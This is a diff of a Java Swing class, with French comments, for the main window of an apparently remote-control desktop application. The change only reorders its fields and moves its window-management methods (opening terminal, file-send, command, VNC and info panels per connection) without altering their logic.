@@ -34,18 +34,18 @@ import constante.Constante;
  */
 public class FenetrePrincipal {
 
-	private JFrame frame;
-	private Vector<Connexion> Index_To_Connexion;  				// Passer d'un index dans la liste a la connection
-	private Vector<Vector<MJInternalFrame>> frames ;			// InternalFrame pour toutes les connexions
 	private Vector<MJInternalFrame> actualframes;				// InternalFrame actuellement a l'ecran
-	private Vector<Integer> fenetres ;							// Pour chaque connection quelle fenetre a été choisie
-	private JToolBar toolBar;									
-	private  JList<String> list;
 	private JDesktopPane desktopPane ;
+	private Vector<Integer> fenetres ;							// Pour chaque connection quelle fenetre a été choisie
+	private JFrame frame;
+	private Vector<Vector<MJInternalFrame>> frames ;			// InternalFrame pour toutes les connexions
+	private Vector<Connexion> Index_To_Connexion;  				// Passer d'un index dans la liste a la connection									
+	private  JList<String> list;
 	private Boolean modifiable;
 	/**
 	 * Launch the application.
 	 */
+	private JToolBar toolBar;
 	
 
 	/**
@@ -57,6 +57,240 @@ public class FenetrePrincipal {
 		modifiable=true;		
 	}
 
+	/**
+	 * Affiche un label/ bouton dès que un nouveau fichier est recu
+	 * @throws InterruptedException
+	 */
+	public void Addinformation(String info) throws InterruptedException
+	{
+		
+		final JButton button = new JButton(info);
+		button.setFont(new Font("Courrier", Font.BOLD, 11));
+		button.setForeground(Color.RED);
+		button.setBackground(Color.YELLOW);
+		button.setVisible(true);
+		button.setEnabled(false);
+		toolBar.add(button);
+		Thread information = new Thread() {								// Lance le thread d'envoi
+			@Override
+			public void run() {
+				try {
+					Thread.sleep(5000);
+					button.setVisible(false);
+				} catch (InterruptedException e) {
+					e.printStackTrace();
+				}
+				}
+		};
+		information.start();			
+		
+	}
+	
+	
+	/**
+	 * Modifie les fenetres actuellement affichées pour que si l'on change de connexion, cela change aussi le workspace
+	 */
+	private synchronized void changeWorkspace()
+	{
+		
+		for(MJInternalFrame frame : actualframes)
+		{
+			frame.setVisible(false);							// Masque les frames de l'ancien espace de travail
+		}
+		int index = getSelectedIndex();							// Recupere le nouvel index
+		actualframes.clear();
+		
+		if(index != -1)
+		{
+			Connexion connexion = Index_To_Connexion.elementAt(index);
+			if(connexion.get_os_name().contains("Win") || connexion.get_os_name().contains("win"))
+			{
+				frame.setIconImage(Toolkit.getDefaultToolkit().getImage(Paths.get("")
+						.toAbsolutePath().toString()+File.separator+"ressources"+File.separator+"WW.png"));
+			}
+			else
+			{
+				frame.setIconImage(Toolkit.getDefaultToolkit().getImage(Paths.get("")
+						.toAbsolutePath().toString()+File.separator+"ressources"+File.separator+"logo27.png"));
+			}
+		}
+		for(int i=0;i<frames.get((index == -1 ) ? 0 : index).size();i++)
+		{
+			if( index  == -1 || frames.get(index).isEmpty()) break;	// Si pas d'indice selectionné ou pas de fenetres active pour la connexion
+			frames.get(index).get(i).setVisible(true);			// Affiche les nouvelles fenetres
+			actualframes.add(frames.get(index).get(i));			// Les ajoute a la liste pour le nouveau espace de travail
+		}
+		list.setEnabled(true);									// Permet de remodifier la liste
+	}
+	
+	
+
+	
+	/**
+	 * Est appele par les MouseClicked avec un code particulier
+	 * Ouvre une nouvelle fenetre suivant le code, verifie qu'elle n'est pas déja ouverte et que l'on a bien séléctionné une connexion
+	 * @param keycode : code indiquant quelle type de fenetre doit etre ouvert
+	 */
+	private void clicked(int keycode)
+	{
+		int index = getSelectedIndex();											// Recupere la connexion actuellement en traitement
+		if(index != -1 )
+		{	
+			if( ( (fenetres.get(index).intValue() & ( 1 << keycode )) == 0) )		// Si une fenetre similaire n'existe pas deja
+			{
+				Connexion connexion =Index_To_Connexion.get(index);			// Pointeur sur la connexion
+
+				if(keycode == Constante.code_terminal_affichage)													// SI une connexion est selectionne
+				{
+					MCmdJInternalFrame mcmdJF = new MCmdJInternalFrame(connexion.get_user_name()+" term",
+										actualframes.size(), connexion);		// Nouvelle fenetre
+					
+					actualframes.addElement(mcmdJF);							// Ajoute la fenetre a la liste de la page actuelle
+					frames.get(index).add(mcmdJF);								// Ajoute la fenetre a la liste des fenetres pour cette connections
+					desktopPane.add(mcmdJF);
+					mcmdJF.setBounds(100, 100, 200, 200);
+					mcmdJF.setSize(400,290);
+					mcmdJF.setLocation(30*actualframes.size(),30*actualframes.size());
+
+					try {
+				         mcmdJF.setSelected(true);
+				      } catch (java.beans.PropertyVetoException e) {}
+					mcmdJF.setVisible(true);
+					
+				}
+				else if(keycode == Constante.code_troll)
+				{	
+					MotherJInternalFrame moJF= new MotherJInternalFrame("Panneau de commande pour "+connexion.get_user_name(), connexion,actualframes.size());
+					actualframes.add(moJF);
+					frames.get(index).add(moJF);
+					desktopPane.add(moJF);
+					moJF.setBounds(100, 100, 200, 200);
+					moJF.setSize(300,300);
+					moJF.setLocation(30*actualframes.size(),30*actualframes.size());
+					try {
+						moJF.setSelected(true);
+				      } catch (java.beans.PropertyVetoException e) {}
+					moJF.setVisible(true);
+				}
+				else if(keycode == Constante.code_envoyer)
+				{
+						MFileInternalFrame mFJF =new MFileInternalFrame("Envoyer Fichier"+ connexion.get_user_name(), connexion,actualframes.size());
+						actualframes.add(mFJF);
+						frames.get(index).add(mFJF);
+						desktopPane.add(mFJF);
+						mFJF.setBounds(100, 100, 200, 200);
+						mFJF.setSize(300,300);
+						mFJF.setLocation(30*actualframes.size(),30*actualframes.size());
+						try {
+							mFJF.setSelected(true);
+					      } catch (java.beans.PropertyVetoException e) {}
+						mFJF.setVisible(true);
+				}
+				else if(keycode == Constante.code_vnc_afficage)
+				{
+
+					Affichage affichage=new Affichage();
+					affichage.setVisible(true);
+				}
+				else if(keycode == Constante.code_info_affichage)
+				{
+					MInfoJInternalFrame minfJF = new MInfoJInternalFrame(connexion.get_user_name()+" info", connexion,actualframes.size());
+					actualframes.add(minfJF );
+					frames.get(index).add(minfJF );
+					desktopPane.add(minfJF );
+					minfJF .setBounds(100, 100, 200, 200);
+					minfJF .setSize(100,150);
+					minfJF .setLocation(30*actualframes.size(),30*actualframes.size());
+					try {
+						minfJF .setSelected(true);
+				      } catch (java.beans.PropertyVetoException e) {}
+					minfJF .setVisible(true);
+				}
+				fenetres.set(index,fenetres.get(index)+ (1 << keycode));		// Indique que l'on ne peut plus creer de nouvelles fenetres pour ce type maintenant
+			}
+			else{
+				try {
+					Addinformation("FENETRE DEJA EXISTENTE");
+				} catch (InterruptedException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+			}
+		}
+	}
+	
+	
+	/**
+	 * Supprime la JInternalFrame fermé par l'utilisateur
+	 * @param mjiFrame
+	 */
+	private  void deletePrivee(MJInternalFrame mjiFrame,int keycode)
+	{
+		if(actualframes.contains(mjiFrame))											// Supprime de la liste des fenetres affichés a l'ecrans
+		{
+			actualframes.removeElement(mjiFrame);
+			mjiFrame.setVisible(false);												// Au cas ou, mais en principe inutil
+			desktopPane.remove(mjiFrame);
+		}
+		int index = getSelectedIndex();
+		if(index != -1)
+		{
+			if(!frames.isEmpty() && frames.size() >= index && frames.get(index).contains(mjiFrame) )
+			{
+				frames.get(index).removeElement(mjiFrame);							// Supprime de la liste des fenetres de la connexion actuelle affichée
+			}
+			if(!fenetres.isEmpty() && keycode != -1)
+			{
+				fenetres.set(index, fenetres.get(index)- (1 << keycode));			// Enleve le code qui empechait d'en creer une nouvelle
+			}
+			
+
+		}
+		
+	}
+	
+	
+	/**
+	 * Methode public appelé depuis le listener de fermeture des JInternalFrame
+	 * Appelle la methode privee de la fenetre principale
+	 * @param mjiFrame
+	 */
+	public void deletePublic(MJInternalFrame mjiFrame,int keycode)
+	{
+		deletePrivee(mjiFrame,keycode);
+	}
+	
+	
+	
+	
+	/**
+	 * Recupere la liste des MJInternalFrame ouverte pour la connection co
+	 * @param co : la connection en question
+	 * @return
+	 */
+	public Vector<MJInternalFrame> getFrameIndexConnection(Connexion co)
+	{
+		Vector<MJInternalFrame> x=frames.get(Index_To_Connexion.indexOf(co));
+		return x;
+	}
+	
+	
+	
+	
+	
+	
+	/**
+	 * Recupere l'index de l'element choisi dans la liste des connexions choisis
+	 * @return
+	 */
+	private int getSelectedIndex()
+	{
+		return list.getSelectedIndex();
+	}
+	
+	
+	
+	
 	/**
 	 * Initialise la fenetre Principale
 	 * Ajoute les ActionListener
@@ -246,17 +480,7 @@ public class FenetrePrincipal {
 	}
 	
 	
-	/**
-	 * Recupere l'index de l'element choisi dans la liste des connexions choisis
-	 * @return
-	 */
-	private int getSelectedIndex()
-	{
-		return list.getSelectedIndex();
-	}
 	
-	
-
 	
 	/**
 	 * Modifie la liste actuelle des connexions possibles
@@ -279,229 +503,5 @@ public class FenetrePrincipal {
 		list.setSelectedIndex(0);
 		modifiable=true;
 		list.setModel(lists);	
-	}
-	
-	
-	/**
-	 * Recupere la liste des MJInternalFrame ouverte pour la connection co
-	 * @param co : la connection en question
-	 * @return
-	 */
-	public Vector<MJInternalFrame> getFrameIndexConnection(Connexion co)
-	{
-		Vector<MJInternalFrame> x=frames.get(Index_To_Connexion.indexOf(co));
-		return x;
-	}
-	
-	
-	/**
-	 * Est appele par les MouseClicked avec un code particulier
-	 * Ouvre une nouvelle fenetre suivant le code, verifie qu'elle n'est pas déja ouverte et que l'on a bien séléctionné une connexion
-	 * @param keycode : code indiquant quelle type de fenetre doit etre ouvert
-	 */
-	private void clicked(int keycode)
-	{
-		int index = getSelectedIndex();											// Recupere la connexion actuellement en traitement
-		if(index != -1 )
-		{	
-			if( ( (fenetres.get(index).intValue() & ( 1 << keycode )) == 0) )		// Si une fenetre similaire n'existe pas deja
-			{
-				Connexion connexion =Index_To_Connexion.get(index);			// Pointeur sur la connexion
-
-				if(keycode == Constante.code_terminal_affichage)													// SI une connexion est selectionne
-				{
-					MCmdJInternalFrame mcmdJF = new MCmdJInternalFrame(connexion.get_user_name()+" term",
-										actualframes.size(), connexion);		// Nouvelle fenetre
-					
-					actualframes.addElement(mcmdJF);							// Ajoute la fenetre a la liste de la page actuelle
-					frames.get(index).add(mcmdJF);								// Ajoute la fenetre a la liste des fenetres pour cette connections
-					desktopPane.add(mcmdJF);
-					mcmdJF.setBounds(100, 100, 200, 200);
-					mcmdJF.setSize(400,290);
-					mcmdJF.setLocation(30*actualframes.size(),30*actualframes.size());
-
-					try {
-				         mcmdJF.setSelected(true);
-				      } catch (java.beans.PropertyVetoException e) {}
-					mcmdJF.setVisible(true);
-					
-				}
-				else if(keycode == Constante.code_troll)
-				{	
-					MotherJInternalFrame moJF= new MotherJInternalFrame("Panneau de commande pour "+connexion.get_user_name(), connexion,actualframes.size());
-					actualframes.add(moJF);
-					frames.get(index).add(moJF);
-					desktopPane.add(moJF);
-					moJF.setBounds(100, 100, 200, 200);
-					moJF.setSize(300,300);
-					moJF.setLocation(30*actualframes.size(),30*actualframes.size());
-					try {
-						moJF.setSelected(true);
-				      } catch (java.beans.PropertyVetoException e) {}
-					moJF.setVisible(true);
-				}
-				else if(keycode == Constante.code_envoyer)
-				{
-						MFileInternalFrame mFJF =new MFileInternalFrame("Envoyer Fichier"+ connexion.get_user_name(), connexion,actualframes.size());
-						actualframes.add(mFJF);
-						frames.get(index).add(mFJF);
-						desktopPane.add(mFJF);
-						mFJF.setBounds(100, 100, 200, 200);
-						mFJF.setSize(300,300);
-						mFJF.setLocation(30*actualframes.size(),30*actualframes.size());
-						try {
-							mFJF.setSelected(true);
-					      } catch (java.beans.PropertyVetoException e) {}
-						mFJF.setVisible(true);
-				}
-				else if(keycode == Constante.code_vnc_afficage)
-				{
-
-					Affichage affichage=new Affichage();
-					affichage.setVisible(true);
-				}
-				else if(keycode == Constante.code_info_affichage)
-				{
-					MInfoJInternalFrame minfJF = new MInfoJInternalFrame(connexion.get_user_name()+" info", connexion,actualframes.size());
-					actualframes.add(minfJF );
-					frames.get(index).add(minfJF );
-					desktopPane.add(minfJF );
-					minfJF .setBounds(100, 100, 200, 200);
-					minfJF .setSize(100,150);
-					minfJF .setLocation(30*actualframes.size(),30*actualframes.size());
-					try {
-						minfJF .setSelected(true);
-				      } catch (java.beans.PropertyVetoException e) {}
-					minfJF .setVisible(true);
-				}
-				fenetres.set(index,fenetres.get(index)+ (1 << keycode));		// Indique que l'on ne peut plus creer de nouvelles fenetres pour ce type maintenant
-			}
-			else{
-				try {
-					Addinformation("FENETRE DEJA EXISTENTE");
-				} catch (InterruptedException e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
-			}
-		}
-	}
-	
-	
-	
-	
-	/**
-	 * Methode public appelé depuis le listener de fermeture des JInternalFrame
-	 * Appelle la methode privee de la fenetre principale
-	 * @param mjiFrame
-	 */
-	public void deletePublic(MJInternalFrame mjiFrame,int keycode)
-	{
-		deletePrivee(mjiFrame,keycode);
-	}
-	
-	
-	
-	
-	
-	
-	/**
-	 * Supprime la JInternalFrame fermé par l'utilisateur
-	 * @param mjiFrame
-	 */
-	private  void deletePrivee(MJInternalFrame mjiFrame,int keycode)
-	{
-		if(actualframes.contains(mjiFrame))											// Supprime de la liste des fenetres affichés a l'ecrans
-		{
-			actualframes.removeElement(mjiFrame);
-			mjiFrame.setVisible(false);												// Au cas ou, mais en principe inutil
-			desktopPane.remove(mjiFrame);
-		}
-		int index = getSelectedIndex();
-		if(index != -1)
-		{
-			if(!frames.isEmpty() && frames.size() >= index && frames.get(index).contains(mjiFrame) )
-			{
-				frames.get(index).removeElement(mjiFrame);							// Supprime de la liste des fenetres de la connexion actuelle affichée
-			}
-			if(!fenetres.isEmpty() && keycode != -1)
-			{
-				fenetres.set(index, fenetres.get(index)- (1 << keycode));			// Enleve le code qui empechait d'en creer une nouvelle
-			}
-			
-
-		}
-		
-	}
-	
-	
-	
-	
-	/**
-	 * Modifie les fenetres actuellement affichées pour que si l'on change de connexion, cela change aussi le workspace
-	 */
-	private synchronized void changeWorkspace()
-	{
-		
-		for(MJInternalFrame frame : actualframes)
-		{
-			frame.setVisible(false);							// Masque les frames de l'ancien espace de travail
-		}
-		int index = getSelectedIndex();							// Recupere le nouvel index
-		actualframes.clear();
-		
-		if(index != -1)
-		{
-			Connexion connexion = Index_To_Connexion.elementAt(index);
-			if(connexion.get_os_name().contains("Win") || connexion.get_os_name().contains("win"))
-			{
-				frame.setIconImage(Toolkit.getDefaultToolkit().getImage(Paths.get("")
-						.toAbsolutePath().toString()+File.separator+"ressources"+File.separator+"WW.png"));
-			}
-			else
-			{
-				frame.setIconImage(Toolkit.getDefaultToolkit().getImage(Paths.get("")
-						.toAbsolutePath().toString()+File.separator+"ressources"+File.separator+"logo27.png"));
-			}
-		}
-		for(int i=0;i<frames.get((index == -1 ) ? 0 : index).size();i++)
-		{
-			if( index  == -1 || frames.get(index).isEmpty()) break;	// Si pas d'indice selectionné ou pas de fenetres active pour la connexion
-			frames.get(index).get(i).setVisible(true);			// Affiche les nouvelles fenetres
-			actualframes.add(frames.get(index).get(i));			// Les ajoute a la liste pour le nouveau espace de travail
-		}
-		list.setEnabled(true);									// Permet de remodifier la liste
-	}
-	
-	
-	
-	
-	/**
-	 * Affiche un label/ bouton dès que un nouveau fichier est recu
-	 * @throws InterruptedException
-	 */
-	public void Addinformation(String info) throws InterruptedException
-	{
-		
-		final JButton button = new JButton(info);
-		button.setFont(new Font("Courrier", Font.BOLD, 11));
-		button.setForeground(Color.RED);
-		button.setBackground(Color.YELLOW);
-		button.setVisible(true);
-		button.setEnabled(false);
-		toolBar.add(button);
-		Thread information = new Thread() {								// Lance le thread d'envoi
-			@Override
-			public void run() {
-				try {
-					Thread.sleep(5000);
-					button.setVisible(false);
-				} catch (InterruptedException e) {
-					e.printStackTrace();
-				}
-				}
-		};
-		information.start();			
-		
 	}
 }
